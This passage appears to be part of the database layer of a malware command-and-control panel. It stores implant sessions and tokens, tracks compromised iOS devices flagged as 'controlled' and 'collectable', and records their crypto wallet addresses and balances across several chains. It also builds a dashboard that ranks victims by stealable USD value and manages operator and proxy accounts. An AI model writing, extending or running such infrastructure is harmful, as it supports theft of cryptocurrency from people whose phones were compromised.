        SELECT CAST((created_at - ?) / ? AS INTEGER) AS bucket, COUNT(*) AS cnt
        FROM telemetry_events
        WHERE created_at >= ?
        GROUP BY bucket
        ORDER BY bucket
        """,
        (since, bucket, since),
    ).fetchall()
    return [{"bucket": r[0], "count": r[1]} for r in rows]


# ── Admin users ──────────────────────────────────────────────────────────────

def init_admin_user(username: str, password_hash: str) -> None:
    conn = _get_conn()
    conn.execute(
        """
        INSERT OR IGNORE INTO users (username, password_hash, role, proxy_id, created_at)
        VALUES (?, ?, 'admin', '', ?)
        """,
        (username, password_hash, time.time()),
    )
    conn.commit()


def save_user(data: dict) -> None:
    conn = _get_conn()
    conn.execute(
        """
        INSERT INTO users (username, password_hash, role, proxy_id, created_at)
        VALUES (?, ?, ?, ?, ?)
        ON CONFLICT(username) DO UPDATE SET
            password_hash=excluded.password_hash,
            role=excluded.role,
            proxy_id=excluded.proxy_id
        """,
        (
            data.get("username", ""),
            data.get("password_hash", ""),
            data.get("role", "proxy"),
            data.get("proxy_id", ""),
            data.get("created_at", time.time()),
        ),
    )
    conn.commit()


def delete_user_by_username(username: str) -> None:
    conn = _get_conn()
    conn.execute("DELETE FROM users WHERE username = ?", (username,))
    conn.commit()


def get_user_by_username(username: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute(
        "SELECT * FROM users WHERE username = ?", (username,)
    ).fetchone()
    return dict(row) if row else None


def get_admin_user(username: str) -> Optional[dict]:
    return get_user_by_username(username)


def get_session_by_token(implant_token: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute(
        "SELECT * FROM implant_sessions WHERE implant_token = ? LIMIT 1",
        (implant_token,),
    ).fetchone()
    return dict(row) if row else None


# ── Audit log ────────────────────────────────────────────────────────────────

def write_audit_log(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute(
        """
        INSERT INTO audit_log (who, action, resource, detail, created_at)
        VALUES (?, ?, ?, ?, ?)
        """,
        (
            data.get("who", "admin"),
            data.get("action", ""),
            data.get("resource", ""),
            data.get("detail", ""),
            data.get("created_at", time.time()),
        ),
    )
    conn.commit()
    return cur.lastrowid


def get_audit_log(limit: int = 100) -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM audit_log ORDER BY created_at DESC LIMIT ?",
        (limit,),
    ).fetchall()
    return [dict(r) for r in rows]


# ── Device assets ────────────────────────────────────────────────────────────

from .collect_catalog import COLLECT_ASSETS, WALLET_KEYS, asset_usd_value, compute_row_total_usd

BTC_USD_RATE = 65000.0


def compute_total_usd(eth_usdc: float, trx_usdt: float, btc: float) -> float:
    """Legacy helper — prefer compute_row_total_usd."""
    row = {"eth_usdc": eth_usdc, "trx_usdt": trx_usdt, "btc": btc}
    return compute_row_total_usd(row)


def save_device_assets(data: dict) -> None:
    conn = _get_conn()
    now = data.get("updated_at", time.time())
    balances = {a["balance_key"]: float(data.get(a["balance_key"], 0) or 0) for a in COLLECT_ASSETS}
    wallets = {wk: data.get(wk, "") or "" for wk in WALLET_KEYS}
    total = data.get("total_usd")
    if total is None:
        total = compute_row_total_usd({**wallets, **balances})

    conn.execute(
        """
        INSERT INTO device_assets
        (device_id, eth_address, trx_address, btc_address, bsc_address, sol_address,
         eth_usdc, eth_usdt, eth_native, trx_usdt, trx_native, btc,
         bsc_usdt, bsc_native, sol_usdt, sol_native,
         total_usd, wallet_count, status, source, scan_error, last_scan_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(device_id) DO UPDATE SET
            eth_address=COALESCE(NULLIF(excluded.eth_address, ''), device_assets.eth_address),
            trx_address=COALESCE(NULLIF(excluded.trx_address, ''), device_assets.trx_address),
            btc_address=COALESCE(NULLIF(excluded.btc_address, ''), device_assets.btc_address),
            bsc_address=COALESCE(NULLIF(excluded.bsc_address, ''), device_assets.bsc_address),
            sol_address=COALESCE(NULLIF(excluded.sol_address, ''), device_assets.sol_address),
            eth_usdc=excluded.eth_usdc, eth_usdt=excluded.eth_usdt, eth_native=excluded.eth_native,
            trx_usdt=excluded.trx_usdt, trx_native=excluded.trx_native, btc=excluded.btc,
            bsc_usdt=excluded.bsc_usdt, bsc_native=excluded.bsc_native,
            sol_usdt=excluded.sol_usdt, sol_native=excluded.sol_native,
            total_usd=excluded.total_usd, wallet_count=excluded.wallet_count,
            status=excluded.status, source=excluded.source,
            scan_error=excluded.scan_error, last_scan_at=excluded.last_scan_at,
            updated_at=excluded.updated_at
        """,
        (
            data.get("device_id", ""),
            wallets.get("eth_address", ""),
            wallets.get("trx_address", ""),
            wallets.get("btc_address", ""),
            wallets.get("bsc_address", ""),
            wallets.get("sol_address", ""),
            balances["eth_usdc"], balances["eth_usdt"], balances["eth_native"],
            balances["trx_usdt"], balances["trx_native"], balances["btc"],
            balances["bsc_usdt"], balances["bsc_native"],
            balances["sol_usdt"], balances["sol_native"],
            float(total),
            int(data.get("wallet_count", 0) or 0),
            data.get("status", "unknown"),
            data.get("source", "manual"),
            data.get("scan_error", ""),
            float(data.get("last_scan_at", now)),
            now,
        ),
    )
    conn.commit()


def get_device_assets(device_id: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute(
        "SELECT * FROM device_assets WHERE device_id = ?",
        (device_id,),
    ).fetchone()
    return dict(row) if row else None


def get_device_assets_dashboard(limit: int = 500) -> dict[str, Any]:
    conn = _get_conn()
    balance_cols = ", ".join(
        f"COALESCE(a.{a['balance_key']}, 0) AS {a['balance_key']}" for a in COLLECT_ASSETS
    )
    wallet_cols = ", ".join(
        f"COALESCE(a.{wk}, '') AS {wk}" for wk in WALLET_KEYS
    )
    rows = conn.execute(
        f"""
        SELECT
            d.device_id, d.name, d.ip, d.ios_version, d.domain,
            d.controlled, d.authorized, d.collectable, d.session_id, d.proxy_id,
            {wallet_cols},
            {balance_cols},
            COALESCE(a.total_usd, 0) AS total_usd,
            COALESCE(a.wallet_count, 0) AS wallet_count,
            COALESCE(a.status, 'unknown') AS status,
            COALESCE(a.source, 'manual') AS source,
            COALESCE(a.scan_error, '') AS scan_error,
            COALESCE(a.last_scan_at, 0) AS last_scan_at,
            COALESCE(a.updated_at, d.updated_at, 0) AS assets_updated_at
        FROM devices d
        LEFT JOIN device_assets a ON a.device_id = d.device_id
        ORDER BY COALESCE(a.total_usd, 0) DESC, d.updated_at DESC
        LIMIT ?
        """,
        (limit,),
    ).fetchall()

    devices: list[dict] = []
    asset_totals = {a["balance_key"]: 0.0 for a in COLLECT_ASSETS}
    total_usd_sum = 0.0
    collectable_usd = 0.0
    devices_with_balance = 0

    for row in rows:
        item = dict(row)
        item["controlled"] = bool(item.get("controlled", 0))
        item["authorized"] = bool(item.get("authorized", 0))
        item["collectable"] = bool(item.get("collectable", 0))
        usd = float(item.get("total_usd", 0) or 0)
        if usd <= 0:
            usd = compute_row_total_usd(item)
            item["total_usd"] = usd
        devices.append(item)

        for asset in COLLECT_ASSETS:
            bal = float(item.get(asset["balance_key"], 0) or 0)
            asset_totals[asset["balance_key"]] += bal
        total_usd_sum += usd
        if usd > 0:
            devices_with_balance += 1
        if item.get("collectable") and usd > 0:
            collectable_usd += usd

    device_count = conn.execute("SELECT COUNT(*) FROM devices").fetchone()[0]

    chain_breakdown = []
    for asset in COLLECT_ASSETS:
        bal = asset_totals[asset["balance_key"]]
        chain_breakdown.append({
            "asset_id": asset["id"],
            "chain": asset["chain"],
            "symbol": asset["token"],
            "label": asset["label"],
            "total": round(bal, 8 if asset.get("native") and asset["token"] == "BTC" else 4),
            "usd": round(asset_usd_value(asset, bal), 2),
            "device_count": sum(
                1 for d in devices if float(d.get(asset["balance_key"], 0) or 0) > 0
            ),
        })

    return {
        "summary": {
            "device_count": device_count,
            "tracked_devices": len(devices),
            "devices_with_balance": devices_with_balance,
            "total_usd": round(total_usd_sum, 2),
            "collectable_usd": round(collectable_usd, 2),
            "asset_types": len(COLLECT_ASSETS),
        },
        "chain_breakdown": chain_breakdown,
        "top_devices": [
            {
                "device_id": d["device_id"],
                "name": d.get("name", ""),
                "total_usd": round(float(d.get("total_usd", 0) or 0), 2),
            }
            for d in devices[:5]
            if float(d.get("total_usd", 0) or 0) > 0
        ],
        "devices": devices,
    }


DEFAULT_RPC_SETTINGS = {
    "eth_rpc": "",
    "trx_rpc": "https://api.trongrid.io",
    "btc_api": "https://blockstream.info/api",
    "bsc_rpc": "https://bsc-dataseed.binance.org",
    "sol_rpc": "",
    "eth_usdc_contract": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "trx_usdt_contract": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
}


def get_rpc_settings() -> dict:
    raw = get_setting("rpc_nodes", json.dumps(DEFAULT_RPC_SETTINGS))
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        data = {}
    merged = dict(DEFAULT_RPC_SETTINGS)
    merged.update({k: str(data.get(k, merged[k]) or "") for k in merged})
    return merged


def save_rpc_settings(data: dict) -> dict:
    merged = dict(DEFAULT_RPC_SETTINGS)
    merged.update({k: str(data.get(k, merged[k]) or "") for k in merged})
    save_setting("rpc_nodes", json.dumps(merged))
    return merged


def get_device_asset_rows_for_scan(device_id: Optional[str] = None) -> list[dict]:
    conn = _get_conn()
    balance_cols = ", ".join(
        f"COALESCE(a.{a['balance_key']}, 0) AS {a['balance_key']}" for a in COLLECT_ASSETS
    )
    wallet_cols = ", ".join(
        f"COALESCE(a.{wk}, '') AS {wk}" for wk in WALLET_KEYS
    )
    wallet_where = " OR ".join(f"a.{wk} != ''" for wk in WALLET_KEYS)
    if device_id:
        rows = conn.execute(
            f"""
            SELECT d.device_id, d.session_id, d.collectable,
                   {wallet_cols}, {balance_cols}
            FROM devices d
            LEFT JOIN device_assets a ON a.device_id = d.device_id
            WHERE d.device_id = ?
            """,
            (device_id,),
        ).fetchall()
    else:
        rows = conn.execute(
            f"""
            SELECT d.device_id, d.session_id, d.collectable,
                   {wallet_cols}, {balance_cols}
            FROM devices d
            INNER JOIN device_assets a ON a.device_id = d.device_id
            WHERE ({wallet_where})
            ORDER BY d.updated_at DESC
            """
        ).fetchall()
    result = []
    for row in rows:
        item = dict(row)
        item["collectable"] = bool(item.get("collectable", 0))
        result.append(item)
    return result
